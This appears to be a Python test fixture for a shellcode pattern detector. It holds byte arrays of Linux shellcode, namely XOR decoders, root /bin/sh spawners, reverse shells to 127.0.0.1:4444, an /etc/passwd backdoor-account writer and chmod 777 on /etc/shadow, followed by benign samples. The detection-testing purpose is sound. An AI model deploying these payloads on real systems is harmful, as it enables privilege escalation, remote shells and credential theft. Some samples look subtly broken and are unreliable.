# Collection of Linux shellcode samples for testing pattern matching
# IMPORTANT: These are for educational/testing purposes only
from signature_analysis.pattern_manager import PatternManager
from signature_analysis.pattern_detector import PatternDetector

# =============== MALICIOUS SHELLCODE EXAMPLES ===============
# Sample 1: Basic XOR decoder (32-bit) with fixed key 0xAA
xor_decoder_sample1 = bytes([
    # Decoder loop
    0xeb, 0x0d,                   # jmp short call_decoder
    # decoder:
    0x5e,                         # pop esi (get shellcode address)
    0x31, 0xc9,                   # xor ecx, ecx
    0xb1, 0x1e,                   # mov cl, 0x1e (30 bytes to decode)
    # decode_loop:
    0x80, 0x36, 0xaa,             # xor byte ptr [esi], 0xaa
    0x46,                         # inc esi
    0xe2, 0xfa,                   # loop decode_loop
    # call_decoder:
    0xe8, 0xee, 0xff, 0xff, 0xff, # call decoder
    # Encoded shellcode follows (XORed with 0xAA)
    0x31, 0x6a, 0x5e, 0x7e, 0x4e, 0x76, 0x44, 0x46, 0x56, 0x57, 0x47, 0x4b,
    0x72, 0x42, 0x4f, 0x4e, 0x4f, 0x4e, 0x63, 0xc6, 0xc7, 0xc8, 0xc9, 0xca,
    0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c
])

# Sample 2: Incremental XOR decoder (64-bit) with key in register
xor_decoder_sample2 = bytes([
    # Decoder loop
    0xe8, 0x0f, 0x00, 0x00, 0x00, # call get_eip
    # encoded_shellcode:
    0x9a, 0xd9, 0x80, 0x39, 0xc3, 0x72, 0x0e, 0x89, 0x70, 0x41, 0x41, 0x41, 0x7e, 0x4e,
    0x57, 0x9e, 0x6a, 0x5e, 0x72, 0x4e, 0x58, 0x70, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c,
    # get_eip:
    0x5e,                         # pop rsi (get shellcode address)
    0x48, 0x83, 0xee, 0x14,       # sub rsi, 0x14 (adjust to start of encoded shellcode)
    0x48, 0x31, 0xc9,             # xor rcx, rcx
    0xb1, 0x1c,                   # mov cl, 0x1c (28 bytes to decode)
    0xb0, 0x41,                   # mov al, 0x41 (XOR key)
    # decode_loop:
    0x30, 0x06,                   # xor byte ptr [rsi], al
    0x48, 0xff, 0xc6,             # inc rsi
    0xfe, 0xc0,                   # inc al (change key each iteration)
    0xe2, 0xf8                    # loop decode_loop
])

# Sample 3: Multiple-pass XOR decoder (32-bit) with key comparison
xor_decoder_sample3 = bytes([
    # Decoder loop
    0xeb, 0x12,                   # jmp short call_decoder
    # decoder:
    0x5e,                         # pop esi (get shellcode address)
    0x8d, 0x3e,                   # lea edi, [esi] (copy pointer)
    # decode_loop:
    0x8a, 0x06,                   # mov al, byte ptr [esi]
    0x3c, 0xbb,                   # cmp al, 0xbb
    0x74, 0x0a,                   # je done (if we hit marker)
    0x80, 0xf0, 0x55,             # xor al, 0x55
    0x88, 0x06,                   # mov byte ptr [esi], al
    0x46,                         # inc esi
    0xeb, 0xf3,                   # jmp decode_loop
    # done:
    0xff, 0xe7,                   # jmp edi (execute decoded shellcode)
    # call_decoder:
    0xe8, 0xe9, 0xff, 0xff, 0xff, # call decoder
    # Encoded shellcode follows (XORed with 0x55)
    0x66, 0x3f, 0x0c, 0x2a, 0x20, 0x18, 0x11, 0x13, 0x01, 0x00, 0x12, 0x1c,
    0x27, 0x17, 0x10, 0x22, 0x10, 0x10, 0x32, 0x93, 0x92, 0x9e, 0x9f, 0x90,
    0x32, 0x33, 0x34, 0x35, 0x36, 0xbb  # Terminator 0xBB
])

# Sample 4: Rolling XOR decoder (64-bit) that uses two keys
xor_decoder_sample4 = bytes([
    # Decoder loop
    0xe8, 0x12, 0x00, 0x00, 0x00, # call get_eip
    # encoded_shellcode:
    0x6a, 0x5e, 0x72, 0x4e, 0x58, 0x70, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c,
    0x4c, 0x76, 0x44, 0x46, 0x56, 0x57, 0x47, 0x4b, 0x72, 0x42, 0x4f, 0x4e,
    0x4f, 0x4e, 0x63, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xff, # Terminator 0xFF
    # get_eip:
    0x5e,                         # pop rsi (get shellcode address)
    0x48, 0x89, 0xf7,             # mov rdi, rsi (save original address)
    0x48, 0x83, 0xee, 0x21,       # sub rsi, 0x21 (adjust to start of encoded shellcode)
    0xb0, 0x41,                   # mov al, 0x41 (XOR key 1)
    0xb1, 0x33,                   # mov cl, 0x33 (XOR key 2)
    # decode_loop:
    0x8a, 0x16,                   # mov dl, byte ptr [rsi]
    0x80, 0xfa, 0xff,             # cmp dl, 0xff
    0x74, 0x0e,                   # je done (if terminator reached)
    0x30, 0xc2,                   # xor dl, al
    0x30, 0xca,                   # xor dl, cl
    0x88, 0x16,                   # mov byte ptr [rsi], dl
    0x48, 0xff, 0xc6,             # inc rsi
    0xfe, 0xc0,                   # inc al (change key 1)
    0xfe, 0xc9,                   # dec cl (change key 2)
    0xeb, 0xeb,                   # jmp decode_loop
    # done:
    0xff, 0xe7                    # jmp rdi (execute decoded shellcode)
])

# Sample 5: Position-dependent XOR decoder (32-bit) using position as key
xor_decoder_sample5 = bytes([
    # Decoder loop
    0xeb, 0x0f,                   # jmp short call_decoder
    # decoder:
    0x5e,                         # pop esi (get shellcode address)
    0x31, 0xc9,                   # xor ecx, ecx
    0xb1, 0x20,                   # mov cl, 0x20 (32 bytes to decode)
    0x31, 0xdb,                   # xor ebx, ebx
    # decode_loop:
    0x8a, 0x06,                   # mov al, byte ptr [esi]
    0x30, 0xd8,                   # xor al, bl
    0x88, 0x06,                   # mov byte ptr [esi], al
    0x46,                         # inc esi
    0xfe, 0xc3,                   # inc bl (position-based key)
    0xe2, 0xf5,                   # loop decode_loop
    # call_decoder:
    0xe8, 0xec, 0xff, 0xff, 0xff, # call decoder
    # Encoded shellcode (XORed with position value)
    0x31, 0x62, 0x53, 0x57, 0x51, 0x75, 0x45, 0x4b, 0x5b, 0x58, 0x4b, 0x49,
    0x77, 0x4b, 0x59, 0x4b, 0x49, 0x48, 0x6b, 0xd3, 0xd3, 0xd9, 0xdb, 0xdf,
    0x6a, 0x76, 0x6c, 0x73, 0x74, 0x75, 0x70, 0x71
])

# Sample 6: Two-pass XOR decoder (64-bit) for evasion
xor_decoder_sample6 = bytes([
    # Decoder loop
    0xe8, 0x16, 0x00, 0x00, 0x00, # call get_eip
    # encoded_shellcode (double-encoded):
    0xc7, 0x89, 0xb0, 0x98, 0x84, 0x96, 0xa5, 0xa3, 0x87, 0x89, 0x91, 0x97,
    0x81, 0x93, 0x85, 0x86, 0x84, 0x95, 0x83, 0x92, 0xb4, 0xb6, 0xb8, 0xba,
    0xbc, 0xbd, 0xbe, 0x88, 0x8a, 0x8c, 0x8e, 0x97, # Encoded bytes
    # get_eip:
    0x5e,                         # pop rsi (get shellcode address)
    0x48, 0x89, 0xf7,             # mov rdi, rsi (save original address)
    0x48, 0x83, 0xee, 0x20,       # sub rsi, 0x20 (adjust to start of encoded shellcode)
    0x48, 0x89, 0xf0,             # mov rax, rsi (save adjusted address)
    0x48, 0x8d, 0x4e, 0x20,       # lea rcx, [rsi+0x20] (end of encoded shellcode)
    # first_pass:
    0x80, 0x36, 0xaa,             # xor byte ptr [rsi], 0xaa
    0x48, 0xff, 0xc6,             # inc rsi
    0x48, 0x39, 0xce,             # cmp rsi, rcx
    0x75, 0xf5,                   # jne first_pass
    # second_pass:
    0x48, 0x89, 0xc6,             # mov rsi, rax (reset to start of shellcode)
    0x48, 0x31, 0xc9,             # xor rcx, rcx
    0xb1, 0x20,                   # mov cl, 0x20 (32 bytes to decode)
    # decode_loop2:
    0x80, 0x36, 0x55,             # xor byte ptr [rsi], 0x55
    0x48, 0xff, 0xc6,             # inc rsi
    0xe2, 0xf8,                   # loop decode_loop2
    # done:
    0xff, 0xe0                    # jmp rax (execute decoded shellcode)
])
# 64-bit Linux /etc/passwd modification shellcode
passwd_mod_64_1 = bytes([
    0x48, 0x31, 0xc0,                   # xor rax, rax
    0x48, 0x31, 0xd2,                   # xor rdx, rdx
    0x48, 0x31, 0xf6,                   # xor rsi, rsi
    0x48, 0xbb, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73,  # mov rbx, "/etc/pas"
    0x53,                               # push rbx
    0x48, 0xbb, 0x73, 0x77, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00,  # mov rbx, "swd"
    0x53,                               # push rbx
    0x48, 0x89, 0xe7,                   # mov rdi, rsp
    0x66, 0xbe, 0x01, 0x02,             # mov si, 0x201 (O_WRONLY | O_CREAT)
    0x66, 0xba, 0xa4, 0x01,             # mov dx, 0x1a4 (0644 permissions)
    0xb0, 0x02,                         # mov al, 2 (open syscall)
    0x0f, 0x05,                         # syscall
    0x48, 0x89, 0xc7,                   # mov rdi, rax
    0x48, 0xbb, 0x72, 0x30, 0x30, 0x74, 0x3a, 0x3a, 0x30, 0x3a,  # mov rbx, "r00t::0:"
    0x53,                               # push rbx
    0x48, 0xbb, 0x30, 0x3a, 0x3a, 0x2f, 0x62, 0x69, 0x6e, 0x2f,  # mov rbx, "0::/bin/"
    0x53,                               # push rbx
    0x48, 0xbb, 0x73, 0x68, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00,  # mov rbx, "sh\n"
    0x53,                               # push rbx
    0x48, 0x89, 0xe6,                   # mov rsi, rsp
    0x48, 0xc7, 0xc2, 0x14, 0x00, 0x00, 0x00,  # mov rdx, 20 (length)
    0xb0, 0x01,                         # mov al, 1 (write syscall)
    0x0f, 0x05,                         # syscall
    0xb0, 0x3c,                         # mov al, 60 (exit syscall)
    0x48, 0x31, 0xff,                   # xor rdi, rdi
    0x0f, 0x05                          # syscall
])

# 32-bit Linux /etc/passwd modification shellcode
passwd_mod_32_1 = bytes([
    0x31, 0xc0,                         # xor eax, eax
    0x31, 0xdb,                         # xor ebx, ebx
    0x31, 0xc9,                         # xor ecx, ecx
    0x31, 0xd2,                         # xor edx, edx
    0x68, 0x73, 0x73, 0x77, 0x64,       # push "sswd"
    0x68, 0x63, 0x2f, 0x70, 0x61,       # push "c/pa"
    0x68, 0x2f, 0x65, 0x74, 0x2f,       # push "/et/"
    0x89, 0xe3,                         # mov ebx, esp
    0x66, 0xb9, 0x01, 0x02,             # mov cx, 0x201 (O_WRONLY | O_CREAT)
    0x66, 0xba, 0xa4, 0x01,             # mov dx, 0x1a4 (0644 permissions)
    0xb0, 0x05,                         # mov al, 5 (open syscall)
    0xcd, 0x80,                         # int 0x80
    0x89, 0xc3,                         # mov ebx, eax
    0x31, 0xc0,                         # xor eax, eax
    0x68, 0x73, 0x68, 0x0a, 0x00,       # push "sh\n\0"
    0x68, 0x69, 0x6e, 0x2f, 0x2f,       # push "in//"
    0x68, 0x30, 0x3a, 0x2f, 0x62,       # push "0:/b"
    0x68, 0x3a, 0x30, 0x3a, 0x30,       # push ":0:0"
    0x68, 0x6f, 0x74, 0x3a, 0x3a,       # push "ot::"
    0x68, 0x72, 0x30, 0x30, 0x74,       # push "r00t"
    0x89, 0xe1,                         # mov ecx, esp
    0xb2, 0x1c,                         # mov dl, 28 (length)
    0xb0, 0x04,                         # mov al, 4 (write syscall)
    0xcd, 0x80,                         # int 0x80
    0x31, 0xc0,                         # xor eax, eax
    0xb0, 0x06,                         # mov al, 6 (close syscall)
    0xcd, 0x80,                         # int 0x80
    0x31, 0xc0,                         # xor eax, eax
    0xb0, 0x01,                         # mov al, 1 (exit syscall)
    0x31, 0xdb,                         # xor ebx, ebx
    0xcd, 0x80                          # int 0x80
])
# 64-bit Linux setgid(0) + execve /bin/sh shellcode
setgid_execve_64 = bytes([
    # setgid(0)
    0x48, 0x31, 0xff,  # xor rdi, rdi        ; Zero out RDI (first argument = 0)
    0xb0, 0x6a,  # mov al, 0x6a        ; 106 = setgid syscall number
    0x0f, 0x05,  # syscall             ; Call setgid(0)

    # execve("/bin/sh", NULL, NULL)
    0x48, 0x31, 0xd2,  # xor rdx, rdx        ; Zero out RDX (third argument)
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # mov rbx, "/bin/sh\0"
    0x53,  # push rbx            ; Push "/bin/sh\0" string to stack
    0x48, 0x89, 0xe7,  # mov rdi, rsp        ; RDI = pointer to "/bin/sh"
    0x48, 0x31, 0xf6,  # xor rsi, rsi        ; RSI = NULL (second argument)
    0xb0, 0x3b,  # mov al, 0x3b        ; 59 = execve syscall number
    0x0f, 0x05  # syscall             ; Call execve("/bin/sh", NULL, NULL)
])

# 32-bit Linux setgid(0) + execve /bin/sh shellcode
setgid_execve_32 = bytes([
    # setgid(0)
    0x31, 0xdb,  # xor ebx, ebx        ; Zero out EBX (first argument = 0)
    0x6a, 0x2e,  # push 0x2e           ; 46 = setgid syscall number
    0x58,  # pop eax             ; EAX = 46
    0xcd, 0x80,  # int 0x80            ; Call setgid(0)

    # execve("/bin/sh", ["/bin/sh", NULL], NULL)
    0x31, 0xc0,  # xor eax, eax        ; Zero out EAX
    0x50,  # push eax            ; Push NULL string terminator
    0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
    0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
    0x89, 0xe3,  # mov ebx, esp        ; EBX = pointer to "/bin/sh" string
    0x50,  # push eax            ; Push NULL
    0x53,  # push ebx            ; Push pointer to "/bin/sh"
    0x89, 0xe1,  # mov ecx, esp        ; ECX = ["/bin/sh", NULL]
    0x99,  # cdq                 ; EDX = 0 (NULL)
    0xb0, 0x0b,  # mov al, 0xb         ; 11 = execve syscall number
    0xcd, 0x80  # int 0x80            ; Call execve
])

# Combined 64-bit Linux setgid(0) + setuid(0) + execve /bin/sh shellcode
setgid_setuid_execve_64 = bytes([
    # setgid(0)
    0x48, 0x31, 0xff,  # xor rdi, rdi        ; Zero out RDI (first argument = 0)
    0xb0, 0x6a,  # mov al, 0x6a        ; 106 = setgid syscall number
    0x0f, 0x05,  # syscall             ; Call setgid(0)

    # setuid(0)
    0x48, 0x31, 0xff,  # xor rdi, rdi        ; Zero out RDI (first argument = 0)
    0xb0, 0x69,  # mov al, 0x69        ; 105 = setuid syscall number
    0x0f, 0x05,  # syscall             ; Call setuid(0)

    # execve("/bin/sh", NULL, NULL)
    0x48, 0x31, 0xd2,  # xor rdx, rdx        ; Zero out RDX (third argument)
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # mov rbx, "/bin/sh\0"
    0x53,  # push rbx            ; Push "/bin/sh\0" string to stack
    0x48, 0x89, 0xe7,  # mov rdi, rsp        ; RDI = pointer to "/bin/sh"
    0x48, 0x31, 0xf6,  # xor rsi, rsi        ; RSI = NULL (second argument)
    0xb0, 0x3b,  # mov al, 0x3b        ; 59 = execve syscall number
    0x0f, 0x05  # syscall             ; Call execve("/bin/sh", NULL, NULL)
])
# 64-bit Linux setuid(0) + execve /bin/sh shellcode
setuid_execve_64 = bytes([
    # setuid(0)
    0x48, 0x31, 0xff,  # xor rdi, rdi        ; Zero out RDI (first argument = 0)
    0xb0, 0x69,  # mov al, 0x69        ; 105 = setuid syscall number
    0x0f, 0x05,  # syscall             ; Call setuid(0)

    # execve("/bin/sh", NULL, NULL)
    0x48, 0x31, 0xd2,  # xor rdx, rdx        ; Zero out RDX (third argument)
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # mov rbx, "/bin/sh\0"
    0x53,  # push rbx            ; Push "/bin/sh\0" string to stack
    0x48, 0x89, 0xe7,  # mov rdi, rsp        ; RDI = pointer to "/bin/sh"
    0x48, 0x31, 0xf6,  # xor rsi, rsi        ; RSI = NULL (second argument)
    0xb0, 0x3b,  # mov al, 0x3b        ; 59 = execve syscall number
    0x0f, 0x05  # syscall             ; Call execve("/bin/sh", NULL, NULL)
])

# 32-bit Linux setuid(0) + execve /bin/sh shellcode
setuid_execve_32 = bytes([
    # setuid(0)
    0x31, 0xdb,  # xor ebx, ebx        ; Zero out EBX (first argument = 0)
    0x6a, 0x17,  # push 0x17           ; 23 = setuid syscall number
    0x58,  # pop eax             ; EAX = 23
    0xcd, 0x80,  # int 0x80            ; Call setuid(0)

    # execve("/bin/sh", ["/bin/sh", NULL], NULL)
    0x31, 0xc0,  # xor eax, eax        ; Zero out EAX
    0x50,  # push eax            ; Push NULL string terminator
    0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
    0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
    0x89, 0xe3,  # mov ebx, esp        ; EBX = pointer to "/bin/sh" string
    0x50,  # push eax            ; Push NULL
    0x53,  # push ebx            ; Push pointer to "/bin/sh"
    0x89, 0xe1,  # mov ecx, esp        ; ECX = ["/bin/sh", NULL]
    0x99,  # cdq                 ; EDX = 0 (NULL)
    0xb0, 0x0b,  # mov al, 0xb         ; 11 = execve syscall number
    0xcd, 0x80  # int 0x80            ; Call execve
])
# 64-bit Linux execve /bin/sh shellcode
execve_bin_sh_64_1 = bytes([
    0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
    0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05
])

# Alternative 64-bit Linux execve /bin/sh shellcode
execve_bin_sh_64_2 = bytes([
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x48, 0x89, 0xe7,
    0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
])

# 32-bit Linux execve /bin/sh shellcode
execve_bin_sh_32_1 = bytes([
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89,
    0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
])

# 32-bit Linux execve /bin/sh shellcode (alternative approach)
execve_bin_sh_32_2 = bytes([
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x89,
    0xe3, 0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x0b, 0xcd, 0x80, 0x31, 0xc0, 0x40, 0xcd, 0x80
])

# 64-bit Linux reverse shell (connects back to 127.0.0.1:4444)
reverse_shell_64 = bytes([
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97,
    0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6,
    0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce,
    0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48,
    0x89, 0xe6, 0x0f, 0x05
])

# 32-bit Linux reverse shell (connects back to 127.0.0.1:4444)
reverse_shell_32 = bytes([
    0x31, 0xdb, 0xf7, 0xe3, 0x53, 0x43, 0x53, 0x6a, 0x02, 0x89, 0xe1, 0xb0, 0x66, 0xcd,
    0x80, 0x93, 0x59, 0xb0, 0x3f, 0xcd, 0x80, 0x49, 0x79, 0xf9, 0x68, 0x7f, 0x00, 0x00,
    0x01, 0x68, 0x02, 0x00, 0x11, 0x5c, 0x89, 0xe1, 0xb0, 0x66, 0x50, 0x51, 0x53, 0xb3,
    0x03, 0x89, 0xe1, 0xcd, 0x80, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62,
    0x69, 0x6e, 0x89, 0xe3, 0x52, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
])

# 64-bit Linux chmod 777 shellcode for /etc/shadow
chmod_shadow_64 = bytes([
    0x48, 0x31, 0xc0, 0x48, 0xbb, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x68, 0x61, 0x53,
    0x48, 0xbb, 0x64, 0x6f, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x53, 0x48, 0x89, 0xe7,
    0x66, 0xbe, 0xff, 0x01, 0x66, 0xba, 0xff, 0x01, 0xb0, 0x5a, 0x0f, 0x05
])

# 32-bit Linux exit shellcode
exit_shellcode_32 = bytes([
    0x31, 0xc0, 0x40, 0x31, 0xdb, 0xcd, 0x80
])

# 64-bit Linux exit shellcode
exit_shellcode_64 = bytes([
    0x48, 0x31, 0xff, 0xb0, 0x3c, 0x0f, 0x05
])

# =============== BENIGN SAMPLES ===============

# 64-bit Linux getuid syscall (just gets the user ID)
getuid_64 = bytes([
    0xb0, 0x66, 0x0f, 0x05
])

# 32-bit Linux getuid syscall
getuid_32 = bytes([
    0x31, 0xc0, 0xb0, 0x18, 0xcd, 0x80
])

# 64-bit Linux hello world shellcode (writes "Hello, World!" to stdout)
hello_world_64 = bytes([
    0x48, 0x31, 0xc0, 0x48, 0x31, 0xdb, 0x48, 0x31, 0xd2, 0x48, 0x31, 0xf6, 0x48, 0xbf,
    0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x57, 0x57, 0x48, 0xc1, 0xe7, 0x08, 0x48,
    0x83, 0xc7, 0x6f, 0x48, 0xc1, 0xe7, 0x08, 0x48, 0x83, 0xc7, 0x72, 0x48, 0xc1, 0xe7,
    0x08, 0x48, 0x83, 0xc7, 0x6c, 0x48, 0xc1, 0xe7, 0x08, 0x48, 0x83, 0xc7, 0x64, 0x48,
    0xc1, 0xe7, 0x08, 0x48, 0x83, 0xc7, 0x21, 0x48, 0xc1, 0xe7, 0x08, 0x48, 0x83, 0xc7,
    0x0a, 0x57, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xc2, 0x0e, 0xb0, 0x01, 0x0f, 0x05, 0xb0,
    0x3c, 0x0f, 0x05
])

# 32-bit get current time shellcode (harmless)
get_time_32 = bytes([
    0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0xb0, 0x0d, 0xcd, 0x80
])

# 64-bit fork process shellcode
fork_process_64 = bytes([
    0xb0, 0x39, 0x0f, 0x05, 0x48, 0x3d, 0x00, 0x00, 0x00, 0x00, 0x74, 0x04, 0xb0, 0x3c,
    0x0f, 0x05
])

# Simple byte sequences that look like shellcode but are actually just data
benign_data_1 = bytes([
    0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x0a
])  # "Hello World\n" in ASCII

# Random x86 instructions that don't do anything harmful
benign_instructions_32 = bytes([
    0x89, 0xc8, 0x89, 0xd9, 0x89, 0xda, 0x89, 0xdb, 0x89, 0xe9, 0x89, 0xea, 0x89, 0xeb,
    0x89, 0xf9, 0x89, 0xfa, 0x89, 0xfb
])

# Function prologue and epilogue (typically seen in legitimate code)
function_frame_64 = bytes([
    0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0x7d, 0xf8, 0x48, 0x83,
    0xc4, 0x10, 0x5d, 0xc3
])


# =============== USAGE EXAMPLE ===============

def test_shellcode_detection():
    # List of all samples for testing
    all_samples = {
        "xor_decoder_sample1": xor_decoder_sample1,
        "xor_decoder_sample2": xor_decoder_sample2,
        "xor_decoder_sample3": xor_decoder_sample3,
        "xor_decoder_sample4": xor_decoder_sample4,
        "xor_decoder_sample5": xor_decoder_sample5,
        "xor_decoder_sample6": xor_decoder_sample6,
        "passwd_mod_64_1": passwd_mod_64_1,
        "passwd_mod_32_1": passwd_mod_32_1,
        "setgid_execve_64":setgid_execve_64,
        "setgid_execve_32": setgid_execve_32,
        "setgid_setuid_execve_64": setgid_setuid_execve_64,
        "setuid_execve_64": setuid_execve_64,
        "setuid_execve_32": setuid_execve_32,
        "execve_bin_sh_64_1": execve_bin_sh_64_1,
        "execve_bin_sh_64_2": execve_bin_sh_64_2,
        "execve_bin_sh_32_1": execve_bin_sh_32_1,
        "execve_bin_sh_32_2": execve_bin_sh_32_2,
        "reverse_shell_64": reverse_shell_64,
        "reverse_shell_32": reverse_shell_32,
        "chmod_shadow_64": chmod_shadow_64,
        "exit_shellcode_32": exit_shellcode_32,
        "exit_shellcode_64": exit_shellcode_64,
        "getuid_64": getuid_64,
        "getuid_32": getuid_32,
        "hello_world_64": hello_world_64,
        "get_time_32": get_time_32,
        "fork_process_64": fork_process_64,
        "benign_data_1": benign_data_1,
        "benign_instructions_32": benign_instructions_32,
        "function_frame_64": function_frame_64,
    }

    pm = PatternManager("patterns")
    detector = PatternDetector(pm)

    for name, sample in all_samples.items():
        # print(f"{name}: {sample.hex()}")
        print(f"{name}:")

        print("Testing 64-bit shellcode:")
        result_64 = detector.detect_shellcode(sample)
        print(f"Detection: {result_64[0]}")
        print(f"Architecture: {result_64[1]}")
        print(f"Confidence: {result_64[2]:.2f}")
        print(f"Reason: {result_64[3]}")


test_shellcode_detection()
